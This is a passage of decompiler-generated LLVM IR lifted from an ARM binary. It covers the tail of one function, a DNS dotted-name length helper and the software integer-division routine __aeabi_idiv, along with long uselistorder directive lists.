  br i1 %v2_1727844, label %dec_label_pc_17280, label %dec_label_pc_171f8.lr.ph

dec_label_pc_171f8.lr.ph:                         ; preds = %dec_label_pc_17274.preheader, %bb34
  %v2_172804663 = phi i1 [ %v2_1728046, %bb34 ], [ false, %dec_label_pc_17274.preheader ]
  %v6_172744361 = phi i32 [ %v6_1727443, %bb34 ], [ %v6_172744356, %dec_label_pc_17274.preheader ]
  %v1_172743960 = phi i32 [ %v1_1727439, %bb34 ], [ %v1_172743952, %dec_label_pc_17274.preheader ]
  %v0_17210.ph59 = phi i32 [ %v0_17274.pre.pre, %bb34 ], [ %v0_171d4, %dec_label_pc_17274.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_17270.pre, %bb34 ], [ 0, %dec_label_pc_17274.preheader ]
  br label %dec_label_pc_171f8

dec_label_pc_17280:                               ; preds = %bb34
  br i1 %v2_1728046, label %dec_label_pc_17280.bb36_crit_edge, label %bb35

dec_label_pc_17280.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_17280
  %v0_17288.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17294

bb35:                                             ; preds = %dec_label_pc_17274.preheader, %dec_label_pc_17280
  %v1_17284 = load i32, i32* %r8.global-to-local, align 4
  %v2_17284 = add i32 %v1_17284, 1
  store i32 %v2_17284, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17294

dec_label_pc_17294:                               ; preds = %dec_label_pc_17230, %bb35, %dec_label_pc_17280.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_17288.pre, %dec_label_pc_17280.bb36_crit_edge ], [ %v2_17284, %bb35 ], [ -1, %dec_label_pc_17230 ]
  store i32 %v3_171d0, i32* @r4, align 4
  store i32 %v6_171d0, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_17210.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_17274, { 1, 0 }
  uselistorder i32 %v5_17220, { 0, 2, 1 }
  uselistorder i32 %v6_1727448, { 2, 1, 0, 3 }
  uselistorder i1 %v2_1728050, { 1, 0 }
  uselistorder i32 %v0_171d4, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 5, 4, 1, 6, 2, 7, 3, 8, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3 }
  uselistorder i1 false, { 0, 8, 40, 36, 41, 42, 43, 44, 45, 2, 75, 4, 46, 13, 47, 48, 49, 12, 50, 51, 53, 54, 55, 56, 57, 58, 59, 52, 15, 60, 28, 16, 29, 61, 62, 63, 18, 17, 9, 10, 64, 65, 66, 11, 19, 67, 30, 31, 68, 32, 33, 20, 37, 38, 5, 21, 69, 34, 35, 70, 71, 14, 22, 72, 73, 74, 39, 76, 1, 25, 24, 26, 23, 6, 7, 27, 3, 77 }
  uselistorder i8 46, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 ()* @memcpy, { 4, 3, 19, 11, 10, 9, 8, 2, 17, 16, 1, 0, 18, 7, 15, 14, 13, 20, 12, 6, 5 }
  uselistorder i32 64, { 0, 8, 4, 5, 6, 1, 2, 11, 12, 7, 3, 9, 10, 13 }
  uselistorder i32* @r3, { 11, 0, 12, 13, 3, 4, 14, 5, 6, 7, 8, 1, 2, 17, 20, 18, 19, 15, 9, 10, 16, 21 }
  uselistorder i32* @r2, { 64, 65, 9, 66, 67, 68, 69, 10, 21, 22, 23, 70, 71, 72, 73, 11, 37, 74, 82, 83, 84, 85, 34, 12, 6, 112, 113, 114, 115, 38, 39, 2, 40, 41, 42, 75, 76, 7, 43, 13, 14, 116, 3, 117, 122, 123, 127, 99, 32, 33, 118, 101, 105, 106, 109, 107, 108, 102, 103, 104, 25, 98, 86, 124, 35, 44, 45, 46, 1, 125, 5, 126, 47, 48, 49, 50, 8, 51, 52, 4, 53, 0, 54, 77, 78, 79, 80, 55, 56, 81, 15, 16, 24, 119, 120, 121, 26, 27, 28, 29, 30, 31, 36, 57, 58, 59, 60, 61, 17, 18, 19, 20, 62, 63, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 100, 110, 111 }
  uselistorder i32* @r5, { 171, 172, 173, 174, 175, 176, 177, 8, 178, 179, 180, 181, 182, 183, 184, 5, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 26, 37, 9, 3, 38, 201, 211, 202, 203, 204, 22, 216, 212, 213, 214, 215, 217, 218, 219, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 10, 104, 105, 220, 224, 11, 226, 225, 4, 227, 12, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 256, 255, 24, 257, 87, 88, 89, 90, 91, 92, 293, 294, 106, 107, 108, 109, 110, 111, 112, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 113, 114, 0, 115, 116, 117, 118, 119, 120, 307, 308, 309, 310, 1, 311, 312, 313, 50, 51, 52, 53, 54, 55, 39, 40, 41, 42, 43, 44, 45, 169, 13, 7, 170, 46, 47, 56, 57, 58, 59, 60, 61, 62, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 63, 64, 65, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 278, 279, 14, 280, 315, 316, 317, 318, 121, 15, 122, 123, 124, 269, 270, 271, 272, 273, 274, 205, 206, 207, 208, 209, 210, 125, 16, 126, 127, 128, 129, 130, 17, 230, 231, 232, 18, 228, 229, 66, 67, 68, 233, 234, 235, 131, 132, 27, 133, 134, 19, 135, 136, 137, 138, 139, 140, 25, 141, 142, 143, 144, 28, 148, 20, 149, 150, 151, 152, 153, 154, 155, 156, 6, 157, 158, 159, 160, 161, 162, 35, 36, 145, 2, 146, 147, 49, 48, 23, 319, 320, 236, 237, 238, 239, 21, 240, 241, 163, 164, 165, 166, 167, 168, 221, 222, 223, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 314, 79, 80, 81, 82, 83, 84, 85, 86, 29, 30, 31, 32, 33, 34, 275, 276, 277 }
  uselistorder label %dec_label_pc_17294, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_17280.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_171f8.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %v0_172a0 = load i32, i32* @r0, align 4
  store i32 %v0_172a0, i32* @lr, align 4
  %v2_172a0 = icmp eq i32 %v0_172a0, 0
  br i1 %v2_172a0, label %bb, label %dec_label_pc_172b8

bb:                                               ; preds = %entry
  ret i32 -1

dec_label_pc_172b0:                               ; preds = %dec_label_pc_172c0
  %v1_172b0 = add i32 %v1_172c8, 2
  br label %dec_label_pc_172e0

dec_label_pc_172b8:                               ; preds = %entry
  %v0_172b8 = load i32, i32* @r1, align 4
  br label %dec_label_pc_172c8

dec_label_pc_172c0:                               ; preds = %dec_label_pc_172c8
  %v2_172d8 = add i32 %v6_172c8, %v1_172cc
  %v2_172c0 = icmp eq i32 %v1_172d4, 192
  br i1 %v2_172c0, label %dec_label_pc_172b0, label %dec_label_pc_172c8

dec_label_pc_172c8:                               ; preds = %dec_label_pc_172c0, %dec_label_pc_172b8
  %v1_172c8 = phi i32 [ %v2_172d8, %dec_label_pc_172c0 ], [ %v0_172b8, %dec_label_pc_172b8 ]
  %v2_172c8 = add i32 %v1_172c8, %v0_172a0
  %v3_172c8 = inttoptr i32 %v2_172c8 to i8*
  %v4_172c8 = load i8, i8* %v3_172c8, align 1
  %v6_172c8 = zext i8 %v4_172c8 to i32
  %v1_172cc = add i32 %v1_172c8, 1
  %v2_172d0 = icmp eq i8 %v4_172c8, 0
  %v1_172d4 = and i32 %v6_172c8, 192
  store i32 %v1_172d4, i32* @ip, align 4
  br i1 %v2_172d0, label %dec_label_pc_172e0, label %dec_label_pc_172c0

dec_label_pc_172e0:                               ; preds = %dec_label_pc_172c8, %dec_label_pc_172b0
  %v1_172e0 = phi i32 [ %v1_172b0, %dec_label_pc_172b0 ], [ %v1_172cc, %dec_label_pc_172c8 ]
  %v2_172e0 = sub i32 %v1_172e0, %v0_172b8
  ret i32 %v2_172e0

; uselistorder directives
  uselistorder i32 %v1_172d4, { 1, 0 }
  uselistorder i32 %v6_172c8, { 1, 0 }
  uselistorder i32 %v1_172c8, { 2, 1, 0 }
  uselistorder i32 %v0_172a0, { 0, 2, 1 }
  uselistorder i32* @ip, { 49, 50, 51, 52, 58, 53, 54, 55, 56, 59, 60, 61, 63, 62, 65, 8, 17, 66, 67, 68, 69, 70, 71, 72, 73, 18, 5, 20, 21, 22, 23, 74, 75, 77, 78, 79, 108, 19, 25, 24, 1, 26, 27, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 28, 29, 30, 31, 32, 33, 34, 35, 169, 10, 11, 0, 12, 13, 14, 15, 16, 111, 112, 7, 113, 6, 114, 80, 81, 82, 83, 84, 85, 99, 100, 163, 57, 103, 104, 4, 105, 106, 102, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 64, 167, 164, 165, 166, 2, 168, 36, 37, 38, 39, 40, 3, 41, 42, 43, 44, 45, 46, 9, 76, 47, 162, 48, 101, 107, 109, 110, 117, 116, 115, 118, 119 }
  uselistorder i8 0, { 66, 17, 25, 26, 67, 16, 22, 68, 48, 72, 70, 47, 71, 69, 46, 40, 9, 10, 73, 74, 78, 79, 24, 62, 63, 75, 76, 77, 15, 80, 41, 49, 82, 0, 81, 50, 42, 83, 84, 85, 86, 87, 88, 11, 53, 92, 1, 90, 89, 51, 2, 91, 52, 3, 93, 94, 27, 4, 96, 95, 54, 97, 98, 99, 100, 43, 44, 102, 103, 101, 12, 13, 14, 104, 5, 28, 105, 18, 106, 107, 19, 64, 29, 30, 6, 108, 109, 110, 112, 113, 114, 115, 111, 45, 116, 117, 118, 119, 120, 20, 31, 32, 33, 34, 35, 36, 23, 7, 8, 122, 121, 37, 123, 124, 38, 125, 55, 21, 126, 127, 128, 129, 131, 56, 132, 133, 130, 134, 135, 136, 137, 139, 138, 140, 65, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 152, 151, 153, 57, 155, 154, 39, 156, 58, 157, 159, 160, 158, 59, 161, 162, 61, 163, 60, 164, 165, 166, 167, 168, 169, 170 }
  uselistorder i32 192, { 4, 0, 1, 5, 2, 3 }
  uselistorder i32* @r1, { 88, 89, 1, 90, 91, 92, 95, 93, 94, 9, 10, 24, 96, 97, 98, 99, 100, 101, 102, 103, 3, 104, 105, 64, 106, 107, 108, 109, 112, 115, 116, 117, 118, 119, 120, 4, 54, 55, 13, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 6, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 5, 192, 193, 11, 110, 111, 65, 66, 67, 68, 69, 70, 71, 72, 73, 14, 19, 20, 194, 2, 195, 25, 26, 134, 37, 38, 197, 135, 140, 141, 144, 142, 143, 136, 137, 138, 139, 27, 196, 28, 15, 121, 127, 132, 131, 198, 199, 200, 74, 75, 76, 16, 130, 17, 77, 122, 123, 124, 125, 126, 7, 8, 12, 78, 79, 80, 0, 81, 82, 83, 18, 22, 23, 113, 114, 84, 85, 21, 29, 30, 31, 32, 33, 34, 35, 36, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 56, 57, 58, 59, 60, 61, 62, 63, 86, 87, 128, 129, 133, 145 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_172e8 = icmp slt i32 %arg2, 0
  %v2_172e8 = icmp eq i32 %arg2, 0
  %v0_172ec = load i32, i32* @r0, align 4
  %v2_172ec = xor i32 %v0_172ec, %arg2
  br i1 %v2_172e8, label %dec_label_pc_17400, label %dec_label_pc_172f4

dec_label_pc_172f4:                               ; preds = %entry
  br i1 %v1_172e8, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_172f4
  %v2_172f4 = sub i32 0, %arg2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_172f4, %bb
  %v1_173c0 = phi i32 [ %v2_172f4, %bb ], [ %arg2, %dec_label_pc_172f4 ]
  %v1_172f8 = add i32 %v1_173c0, -1
  %v7_172f8 = icmp eq i32 %v1_173c0, 1
  br i1 %v7_172f8, label %dec_label_pc_173a0, label %dec_label_pc_17300

dec_label_pc_17300:                               ; preds = %thread-pre-split
  %v1_17300 = icmp slt i32 %v0_172ec, 0
  br i1 %v1_17300, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_17300
  %v2_17304 = sub i32 0, %v0_172ec
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_17300, %bb85
  %v0_173f4 = phi i32 [ %v0_172ec, %dec_label_pc_17300 ], [ %v2_17304, %bb85 ]
  %v3_17308 = icmp uge i32 %v0_173f4, %v1_173c0
  %v9_17308 = icmp eq i32 %v0_173f4, %v1_173c0
  %v2_1730c = xor i1 %v3_17308, true
  %v3_1730c = or i1 %v9_17308, %v2_1730c
  br i1 %v3_1730c, label %dec_label_pc_173ac, label %dec_label_pc_17310

dec_label_pc_17310:                               ; preds = %bb86
  %v2_17310 = and i32 %v1_172f8, %v1_173c0
  %v4_17310 = icmp eq i32 %v2_17310, 0
  br i1 %v4_17310, label %dec_label_pc_173bc, label %dec_label_pc_17318

dec_label_pc_17318:                               ; preds = %dec_label_pc_17310
  %v3_17318 = icmp ult i32 %v1_173c0, 536870912
  br i1 %v3_17318, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_17318
  %v4_1731c = mul i32 %v1_173c0, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_17318, %.thread
  %v0_1733c.pr40.ph = phi i32 [ %v4_1731c, %.thread ], [ %v1_173c0, %dec_label_pc_17318 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_17318 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1733c.pr40 = phi i32 [ %v4_17330, %bb89 ], [ %v0_1733c.pr40.ph, %.preheader.preheader ]
  %v1_17334 = phi i32 [ %v4_17334, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_17328 = icmp ugt i32 %v0_1733c.pr40, 268435455
  br i1 %v2_17328, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1733cthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1732c = icmp ult i32 %v0_1733c.pr40, %v0_173f4
  br i1 %v4_1732c, label %bb88, label %dec_label_pc_1733cthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_17330 = and i32 %v0_1733c.pr40, 268435456
  %v3_17330 = icmp eq i32 %v2_17330, 0
  %v4_17330 = mul i32 %v0_1733c.pr40, 16
  br i1 %v3_17330, label %bb89, label %dec_label_pc_1733c.loopexit

bb89:                                             ; preds = %bb88
  %v2_17334 = and i32 %v1_17334, 268435456
  %v3_17334 = icmp eq i32 %v2_17334, 0
  %v4_17334 = mul i32 %v1_17334, 16
  br i1 %v3_17334, label %.preheader, label %dec_label_pc_1733cthread-pre-split.loopexit.loopexit

dec_label_pc_1733cthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1734852.ph = phi i32 [ %v1_17334, %bb87 ], [ %v4_17334, %bb89 ]
  %v0_1733c.pr42.ph = phi i32 [ %v0_1733c.pr40, %bb87 ], [ %v4_17330, %bb89 ]
  br label %dec_label_pc_1733cthread-pre-split.loopexit

dec_label_pc_1733cthread-pre-split.loopexit:      ; preds = %dec_label_pc_1733cthread-pre-split.loopexit.loopexit, %.thread3
  %v1_1734852 = phi i32 [ %v1_17334, %.thread3 ], [ %v1_1734852.ph, %dec_label_pc_1733cthread-pre-split.loopexit.loopexit ]
  %v0_1733c.pr42 = phi i32 [ %v0_1733c.pr40, %.thread3 ], [ %v0_1733c.pr42.ph, %dec_label_pc_1733cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1733cthread-pre-split

dec_label_pc_1733cthread-pre-split:               ; preds = %dec_label_pc_1733cthread-pre-split.loopexit, %bb91
  %v1_1734850 = phi i32 [ %v1_1734852, %dec_label_pc_1733cthread-pre-split.loopexit ], [ %v3_17348, %bb91 ]
  %v2_1734048 = phi i32 [ %v0_173f4, %dec_label_pc_1733cthread-pre-split.loopexit ], [ %v2_17340, %bb91 ]
  %v0_1733c.pr = phi i32 [ %v0_1733c.pr42, %dec_label_pc_1733cthread-pre-split.loopexit ], [ %v3_17344, %bb91 ]
  br label %dec_label_pc_1733c

dec_label_pc_1733c.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1733c

dec_label_pc_1733c:                               ; preds = %dec_label_pc_1733c.loopexit, %dec_label_pc_1733cthread-pre-split
  %v1_17348 = phi i32 [ %v1_1734850, %dec_label_pc_1733cthread-pre-split ], [ %v1_17334, %dec_label_pc_1733c.loopexit ]
  %v2_17340 = phi i32 [ %v2_1734048, %dec_label_pc_1733cthread-pre-split ], [ %v0_173f4, %dec_label_pc_1733c.loopexit ]
  %v1_17344 = phi i32 [ %v0_1733c.pr, %dec_label_pc_1733cthread-pre-split ], [ %v4_17330, %dec_label_pc_1733c.loopexit ]
  %v2_1733c = icmp slt i32 %v1_17344, 0
  br i1 %v2_1733c, label %dec_label_pc_17350, label %bb90

bb90:                                             ; preds = %dec_label_pc_1733c
  %v4_17340 = icmp ult i32 %v1_17344, %v2_17340
  br i1 %v4_17340, label %bb91, label %dec_label_pc_17350

bb91:                                             ; preds = %bb90
  %v3_17344 = mul i32 %v1_17344, 2
  %v2_17348 = icmp slt i32 %v1_17348, 0
  %v3_17348 = mul i32 %v1_17348, 2
  br i1 %v2_17348, label %dec_label_pc_17350, label %dec_label_pc_1733cthread-pre-split

dec_label_pc_17350:                               ; preds = %bb90, %dec_label_pc_1733c, %bb91
  %v2_1735c63 = phi i32 [ %v3_17348, %bb91 ], [ %v1_17348, %bb90 ], [ %v1_17348, %dec_label_pc_1733c ]
  %v1_1735455 = phi i32 [ %v3_17344, %bb91 ], [ %v1_17344, %bb90 ], [ %v1_17344, %dec_label_pc_1733c ]
  br label %dec_label_pc_17354

dec_label_pc_17354:                               ; preds = %.thread13, %dec_label_pc_17350
  %v1_17388 = phi i32 [ %v4_17388, %.thread13 ], [ %v2_1735c63, %dec_label_pc_17350 ]
  %v1_1735c = phi i32 [ %v1_17398, %.thread13 ], [ 0, %dec_label_pc_17350 ]
  %v1_1738c = phi i32 [ %v4_1738c, %.thread13 ], [ %v1_1735455, %dec_label_pc_17350 ]
  %v1_17358 = phi i32 [ %v0_17384, %.thread13 ], [ %v0_173f4, %dec_label_pc_17350 ]
  %v3_17354 = icmp ult i32 %v1_17358, %v1_1738c
  br i1 %v3_17354, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_17354
  %v3_17358 = sub i32 %v1_17358, %v1_1738c
  %v3_1735c = or i32 %v1_1735c, %v1_17388
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17354, %bb92
  %v1_17364 = phi i32 [ %v1_17358, %dec_label_pc_17354 ], [ %v3_17358, %bb92 ]
  %v1_17368 = phi i32 [ %v1_1735c, %dec_label_pc_17354 ], [ %v3_1735c, %bb92 ]
  %v4_17360 = udiv i32 %v1_1738c, 2
  %v6_17360 = icmp ult i32 %v1_17364, %v4_17360
  br i1 %v6_17360, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_17364 = urem i32 %v1_1738c, 2
  %v4_17364 = icmp eq i32 %v3_17364, 0
  %v6_17364 = sub i32 %v1_17364, %v4_17360
  br i1 %v4_17364, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_17368 = udiv i32 %v1_17388, 2
  %v6_17368 = or i32 %v1_17368, %v5_17368
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_17370 = phi i32 [ %v6_17364, %bb93 ], [ %v1_17364, %.thread8 ], [ %v6_17364, %bb94 ]
  %v1_17374 = phi i32 [ %v1_17368, %bb93 ], [ %v1_17368, %.thread8 ], [ %v6_17368, %bb94 ]
  %v4_1736c = udiv i32 %v1_1738c, 4
  %v6_1736c = icmp ult i32 %v1_17370, %v4_1736c
  br i1 %v6_1736c, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_17370 = and i32 %v1_1738c, 2
  %v4_17370 = icmp eq i32 %v3_17370, 0
  %v6_17370 = sub i32 %v1_17370, %v4_1736c
  br i1 %v4_17370, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_17374 = udiv i32 %v1_17388, 4
  %v6_17374 = or i32 %v1_17374, %v5_17374
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1737c = phi i32 [ %v6_17370, %bb95 ], [ %v1_17370, %.thread9 ], [ %v6_17370, %bb96 ]
  %v1_17380 = phi i32 [ %v1_17374, %bb95 ], [ %v1_17374, %.thread9 ], [ %v6_17374, %bb96 ]
  %v4_17378 = udiv i32 %v1_1738c, 8
  %v6_17378 = icmp ult i32 %v1_1737c, %v4_17378
  br i1 %v6_17378, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1737c = and i32 %v1_1738c, 4
  %v4_1737c = icmp eq i32 %v3_1737c, 0
  %v6_1737c = sub i32 %v1_1737c, %v4_17378
  br i1 %v4_1737c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_17380 = udiv i32 %v1_17388, 8
  %v6_17380 = or i32 %v1_17380, %v5_17380
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_17398 = phi i32 [ %v1_17380, %bb97 ], [ %v1_17380, %.thread10 ], [ %v6_17380, %bb98 ]
  %v0_17384 = phi i32 [ %v6_1737c, %bb97 ], [ %v1_1737c, %.thread10 ], [ %v6_1737c, %bb98 ]
  %v2_17384 = icmp eq i32 %v0_17384, 0
  br i1 %v2_17384, label %dec_label_pc_17394, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_17388, 16
  br i1 %tmp, label %dec_label_pc_17394, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_17388 = udiv i32 %v1_17388, 16
  %v4_1738c = udiv i32 %v1_1738c, 16
  br label %dec_label_pc_17354

dec_label_pc_17394:                               ; preds = %thread-pre-split12, %bb99
  %v1_17394 = icmp slt i32 %v2_172ec, 0
  br i1 %v1_17394, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_17394
  %v2_17398 = sub i32 0, %v1_17398
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_173a0, %dec_label_pc_17394, %bb100
  %v1_1739c = phi i32 [ %v1_17398, %dec_label_pc_17394 ], [ %v2_17398, %bb100 ], [ %v0_172ec, %dec_label_pc_173a0 ], [ %v2_173a4, %bb101 ], [ %v1_173b880, %bb103 ], [ %v2_173b4, %bb104 ]
  ret i32 %v1_1739c

dec_label_pc_173a0:                               ; preds = %thread-pre-split
  br i1 %v1_172e8, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_173a0
  %v2_173a4 = sub i32 0, %v0_172ec
  br label %.thread16

dec_label_pc_173ac:                               ; preds = %bb86
  br i1 %v3_17308, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_173ac
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_173ac, %bb102
  %v1_173b880 = phi i32 [ %v0_172ec, %dec_label_pc_173ac ], [ 0, %bb102 ]
  br i1 %v9_17308, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_173b0 = ashr i32 %v2_172ec, 31
  %v2_173b4 = or i32 %v4_173b0, 1
  br label %.thread16

dec_label_pc_173bc:                               ; preds = %dec_label_pc_17310
  %v2_173bc = icmp ugt i32 %v1_173c0, 65535
  br i1 %v2_173bc, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_173bc
  %v2_173c0 = and i32 %v1_173c0, 32768
  %v3_173c0 = icmp eq i32 %v2_173c0, 0
  %v4_173c0 = udiv i32 %v1_173c0, 65536
  br i1 %v3_173c0, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_173bc
  %v0_173cc70 = phi i32 [ %v1_173c0, %dec_label_pc_173bc ], [ %v4_173c0, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_173d0 = phi i32 [ %v0_173cc70, %.thread19 ], [ %v4_173c0, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_173cc = icmp ugt i32 %v1_173d0, 255
  br i1 %v2_173cc, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_173d0 = and i32 %v1_173d0, 128
  %v3_173d0 = icmp eq i32 %v2_173d0, 0
  %v4_173d0 = udiv i32 %v1_173d0, 256
  br i1 %v3_173d0, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_173d4 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_173e0 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_173d4, %bb108 ]
  %v1_173dc = phi i32 [ %v1_173d0, %bb106 ], [ %v4_173d0, %bb107 ], [ %v4_173d0, %bb108 ]
  %v2_173d8 = icmp ugt i32 %v1_173dc, 15
  br i1 %v2_173d8, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_173dc = and i32 %v1_173dc, 8
  %v3_173dc = icmp eq i32 %v2_173dc, 0
  %v4_173dc = udiv i32 %v1_173dc, 16
  br i1 %v3_173dc, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_173e0 = add nsw i32 %v1_173e0, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_173e8 = phi i32 [ %v1_173e0, %.thread20 ], [ %v1_173e0, %bb109 ], [ %v2_173e0, %bb110 ]
  %v5_173ec = phi i32 [ %v1_173dc, %.thread20 ], [ %v4_173dc, %bb109 ], [ %v4_173dc, %bb110 ]
  %v2_173e4 = icmp ugt i32 %v5_173ec, 3
  %v7_173e4 = icmp eq i32 %v5_173ec, 4
  %v2_173e8 = xor i1 %v7_173e4, true
  %v3_173e8 = and i1 %v2_173e4, %v2_173e8
  br i1 %v3_173e8, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_173e8 = add nsw i32 %v4_173e8, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_173ec = phi i32 [ %v4_173e8, %.thread21 ], [ %v5_173e8, %bb111 ]
  %v2_173ec = xor i1 %v2_173e4, true
  %v3_173ec = or i1 %v7_173e4, %v2_173ec
  br i1 %v3_173ec, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_173ec = udiv i32 %v5_173ec, 2
  %v9_173ec = add i32 %v4_173ec, %v8_173ec
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_173f4 = phi i32 [ %v4_173ec, %bb112 ], [ %v9_173ec, %bb113 ]
  %v1_173f0 = icmp slt i32 %v2_172ec, 0
  %v6_173f4 = lshr i32 %v0_173f4, %v1_173f4
  %v2_173f8 = sub i32 0, %v6_173f4
  %v2_173f8.v6_173f4 = select i1 %v1_173f0, i32 %v2_173f8, i32 %v6_173f4
  ret i32 %v2_173f8.v6_173f4

dec_label_pc_17400:                               ; preds = %entry
  %v0_17400 = load i32, i32* @lr, align 4
  %v0_17404 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_17400)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_173ec, { 1, 0 }
  uselistorder i1 %v7_173e4, { 1, 0 }
  uselistorder i32 %v4_173dc, { 1, 0 }
  uselistorder i32 %v1_173dc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_173d0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_173d0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_173c0, { 1, 0 }
  uselistorder i32 %v0_17384, { 1, 0 }
  uselistorder i32 %v4_17378, { 1, 0 }
  uselistorder i32 %v1_17380, { 1, 2, 0 }
  uselistorder i32 %v4_1736c, { 1, 0 }
  uselistorder i32 %v1_17374, { 1, 2, 0 }
  uselistorder i32 %v4_17360, { 1, 0 }
  uselistorder i32 %v1_17368, { 1, 2, 0 }
  uselistorder i32 %v1_1738c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1735c, { 1, 0 }
  uselistorder i32 %v1_17388, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_17348, { 1, 0 }
  uselistorder i32 %v3_17344, { 1, 0 }
